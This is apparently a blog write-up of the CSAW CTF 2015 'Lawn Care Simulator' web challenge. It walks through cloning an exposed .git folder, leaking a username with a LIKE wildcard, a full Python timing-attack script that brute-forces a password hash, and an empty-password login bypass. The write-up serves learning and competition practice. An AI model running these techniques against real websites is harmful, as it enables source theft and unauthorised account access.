---
layout: post
title: CSAW CTF Qualification Round 2015 - Lawn Care Simulator
---

A game that you can click to grow your grass! Neat! Well let us take a look around shall we? If you take a look at the source code under the premium section there is an interesting JS segment:

```html
        function init(){
            document.getElementById('login_form').onsubmit = function() {
                var pass_field = document.getElementById('password'); 
                pass_field.value = CryptoJS.MD5(pass_field.value).toString(CryptoJS.enc.Hex);
        };
        $.ajax('.git/refs/heads/master').done(function(version){$('#version').html('Version: ' +  version.substring (0,6))});
        initGrass();
    }
```

An ajax request is being made to the .git/refs/heads/master file. This indicates that the version is the commit hash being pulled from this master head file. What is interesting to us though is that this website appears to be hosted directly from a folder containing git information. Well let's try cloning it:

```bash
web200$ git clone http://54.175.3.248:8089/.git
Cloning into '8089'...

web200$ ls ./8089
___HINT___  index.html  jobs.html  js  premium.php  sign_up.php  validate_pass.php
```

Wow, well we just stole their source code using git :D. Now that we have the source code we can proceed to look for vulnerabilities. If we take a look at `sign_up.php` we see where POST requests are processed:

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST'){
    require_once 'db.php';
    $link = mysql_connect($DB_HOST, $SQL_USER, $SQL_PASSWORD) or die('Could not connect: ' . mysql_error());
    mysql_select_db('users') or die("Mysql error");
    $user = mysql_real_escape_string($_POST['username']);
    // check to see if the username is available
    $query = "SELECT username FROM users WHERE username LIKE '$user';";
    $result = mysql_query($query) or die('Query failed: ' . mysql_error());
    $line = mysql_fetch_row($result, MYSQL_ASSOC);
    if ($line == NULL){
        // Signing up for premium is still in development
        echo '<h2 style="margin: 60px;">Lawn Care Simulator 2015 is currently in a private beta. Please check back later</h2>';
    }
    else {
        echo '<h2 style="margin: 60px;">Username: ' . $line['username'] . " is not available</h2>";
    }
}
```

Can you spot the issue? They're calling `$user = mysql_real_escape_string($_POST['username']);` so this is not vulnerable to SQL injection. If we proceed further we do see: `$query = "SELECT username FROM users WHERE username LIKE '$user';";`. Wildcards **%** are not escaped, and as you can see the username is echoed back to us in full when not available: `echo '<h2 style="margin: 60px;">Username: ' . $line['username'] . " is not available</h2>";` so we can do: **%a%** which yields: 

```
Username: ~~FLAG~~ is not available
```

Great! Now we have a username to use. Now let's see how the login page is being processed and how we can gain access. `validate_pass.php` is the file that is validating our password on login, again it appears that they are protecting against SQL injection using `mysql_real_escape_string()` and the hash associated with the user is being selected from a row returned for this user from the DB: `$hash = $line['hash'];`. A length check then a while loop is used to compare each character of our supplied hash (JS performs MD5 conversion on submission):

```php
  if (strlen($pass) != strlen($hash))
        return False;
    $index = 0;
    while($hash[$index]){
        if ($pass[$index] != $hash[$index])
            return false;
        # Protect against brute force attacks
        usleep(300000);
        $index+=1;
    }
    return true;
```

In an attempt to mitigate brute force attacks `usleep(300000);` is performed. This is done on every iteration of the character checks, which can be used as an indicator that a correct hash character has been guessed. The result being that the hash in its entirety can be brute forced:

```python
import urllib
import time

alphabet = "0123456789abcdefABCDEF"

correct = 0
#PWD = '667e217666AAAAAAAAAAAAAAAAAAAAAA'
PWD = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

def test_password(PWD):
    params = urllib.urlencode({'username': '~~FLAG~~', 'password': PWD})
    start = time.time()
    f = urllib.urlopen("http://54.175.3.248:8089/premium.php", params)
    received = f.read()
    end = time.time()
    return end - start

for i in range(0,32):
    max_time = []
    time_taken = []
    for c in alphabet:
        templist = list(PWD)
        templist[i] = c
        PWD = "".join(templist)
        diff = test_password(PWD)
        time_taken.append(diff)
        #print "PWD: " + PWD + " - " + str(diff)
        if not max_time:
            max_time = [diff, c]
        else:
            if diff > max_time[0]:
                max_time = [diff, c]
        time.sleep(0.5)


    templist = list(PWD)
    templist[i] = max_time[1]
    PWD = "".join(templist)
    print "%d - %s %r" % (i, PWD, time_taken)
``` 

We also noticed that only 10 of the valid hash characeters were needed to login correctly. Shortly after we also discovered a simpler route, which was to supply a non-existing username and a blank password parameter to the `validate($user, $pass)` function. The reason this works is that the row fetched returns an empty string, which provides an empty hash. The length comparison `if (strlen($pass) != strlen($hash))` is valid, and since there are no characters are checked the while loop never occurs, which returns true, logging us in and yielding: `flag{gr0wth__h4ck!nG!1!1!}`


